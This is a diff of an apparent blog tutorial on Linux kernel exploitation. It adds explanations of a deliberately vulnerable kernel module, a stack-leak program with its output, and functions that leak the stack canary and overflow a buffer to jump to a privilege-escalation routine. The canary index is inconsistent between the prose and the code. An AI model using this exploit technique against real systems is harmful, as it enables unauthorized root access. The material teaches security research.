@@ -275,7 +275,7 @@ __asm__(
 load_user_space(&lt;span style="color:#75715e">/* target return address */&lt;/span>);
 }
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
+&lt;p>I&amp;rsquo;ve written a vulnerable kernel module to demonstrate the exploit technique detailed above. This kernel module has buffer overflow vulnerabilities in both its &lt;code>challenge_read&lt;/code> and &lt;code>challenge_write&lt;/code> functions.&lt;/p>
 &lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/1/challenge.c">challenge.c&lt;/a>&lt;/p>
 &lt;div class="collapsable-code">
 &lt;input id="1" type="checkbox" checked />
@@ -334,14 +334,16 @@ proc_remove(proc_entry);
 }
 &lt;/code>&lt;/pre>
 &lt;/div>
-&lt;p>&amp;hellip;&lt;/p>
+&lt;p>In the code block below we can see the kernel module&amp;rsquo;s &lt;code>read&lt;/code> handler. It copies an arbitrary number of bytes from a 128 byte buffer into a globally accessible buffer &lt;code>out&lt;/code> of size 256 bytes. This means we can read 128 bytes below the small &lt;code>tmp&lt;/code> buffer.&lt;/p>
+&lt;p>Perhaps we can use this to read stack values (e.g. the value of the stack canary).&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_read&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
 {
 &lt;span style="color:#66d9ef">char&lt;/span> tmp[&lt;span style="color:#ae81ff">128&lt;/span>];
 memcpy(out, tmp, len);
 &lt;span style="color:#66d9ef">return&lt;/span> copy_to_user(buf, out, len);
 }
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>In the code block below we can see the kernel module&amp;rsquo;s &lt;code>write&lt;/code> handler. It copies an arbitrary number of bytes into a 256 byte buffer &lt;code>out&lt;/code>, that are then copied into a buffer stored on the stack &lt;code>tmp&lt;/code> of size 128 bytes.&lt;/p>
+&lt;p>This gives us a buffer overflow of 128 bytes that we can potentially use to control process execution.&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_write&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
 {
 &lt;span style="color:#66d9ef">char&lt;/span> tmp[&lt;span style="color:#ae81ff">128&lt;/span>];
@@ -351,7 +353,7 @@ memcpy(tmp, out, len);
 &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
 }
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploiting-the-kernel-module">Exploiting the Kernel Module&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
+&lt;p>First, let&amp;rsquo;s use the buffer overflow vulnerability in the kernel module&amp;rsquo;s &lt;code>read&lt;/code> function to dump a bunch of stack values. The below code reads 32 &lt;code>unsigned long&lt;/code> values (256 bytes) and prints them out.&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
 &lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
 &lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;assert.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
@@ -365,55 +367,55 @@ assert(fd &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="colo
 &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> leak[&lt;span style="color:#ae81ff">32&lt;/span>];
 read(fd, leak, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>);
 &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i)
-printf(&lt;span style="color:#e6db74">&amp;#34;0x%lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, leak[i]);
+printf(&lt;span style="color:#e6db74">&amp;#34;%d: 0x%lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, i, leak[i]);
 &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
 }
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>In the output below we can see a couple values that look like a stack canary and a return address in kernel-space. We can see these are at indexes 16 and 17.&lt;/p>
 &lt;pre>&lt;code>/home/ctf # ./exploit
-0xffffffff81c00194
-0xffffffff81c001a0
-0xffffffff81aa85a0
-0xffffffff81345d8b
-0x4
-0xffff888006bf5700
-0x20000075a4070
-0xffff888006bf5710
-0x100020000
-0x0
-0xffff888000000000
-0x0
-0x0
-0x0
-0x0
-0xa73ee2eeab3d9f00 &amp;lt;-- stack canary
-0xa73ee2eeab3d9f00
-0xffff888006bcd840 &amp;lt;-- return address
-0xfffffffffffffffb
-0xffffffff8123e347
-0x1
-0x0
-0xffffffff811c89f8
-0xffff888006bf5700
-0xffff888006bf5700
-0x7ffeeb3f3d10
-0x100
-0x0
-0x0
-0xffffffff811c8d1a
-0x0
-0xa73ee2eeab3d9f00
-&lt;/code>&lt;/pre>&lt;p>&amp;hellip;&lt;/p>
+0: 0xffffffff81c00194
+1: 0xffffffff81c001a0
+2: 0xffffffff81aa85a0
+3: 0xffffffff81345d8b
+4: 0x4
+5: 0xffff888006bf5700
+6: 0x20000075a4070
+7: 0xffff888006bf5710
+8: 0x100020000
+9: 0x0
+10: 0xffff888000000000
+11: 0x0
+12: 0x0
+13: 0x0
+14: 0x0
+15: 0xa73ee2eeab3d9f00
+16: 0xa73ee2eeab3d9f00 &amp;lt;-- stack canary
+17: 0xffff888006bcd840 &amp;lt;-- return address
+18: 0xfffffffffffffffb
+19: 0xffffffff8123e347
+20: 0x1
+21: 0x0
+22: 0xffffffff811c89f8
+23: 0xffff888006bf5700
+24: 0xffff888006bf5700
+25: 0x7ffeeb3f3d10
+26: 0x100
+27: 0x0
+28: 0x0
+29: 0xffffffff811c8d1a
+30: 0x0
+31: 0xa73ee2eeab3d9f00
+&lt;/code>&lt;/pre>&lt;p>Now we can write a function that leaks the stack canary, so we can use it later when we want to redirect process execution. From our investigation above we can see that the stack canary is stored at index 16 (just below the &lt;code>tmp&lt;/code> buffer on the stack).&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">leak_canary&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd)
 {
 &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> leak[&lt;span style="color:#ae81ff">32&lt;/span>];
 read(fd, leak, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>);
 &lt;span style="color:#66d9ef">return&lt;/span> leak[&lt;span style="color:#ae81ff">15&lt;/span>];
 }
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>We should also write a function that overflows the buffer in the &lt;code>write&lt;/code> handler and redirect process execution to our &lt;code>escalate_privileges&lt;/code> function. We&amp;rsquo;ll also want to overwrite the stack canary so the kernel module doesn&amp;rsquo;t detect the overflow and halt execution.&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">overflow_buffer&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> canary)
 {
 &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> payload[&lt;span style="color:#ae81ff">18&lt;/span>];
-payload[&lt;span style="color:#ae81ff">15&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> canary;
+payload[&lt;span style="color:#ae81ff">16&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> canary;
 payload[&lt;span style="color:#ae81ff">17&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>)escalate_privileges;
 write(fd, payload, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">18&lt;/span>);
 }
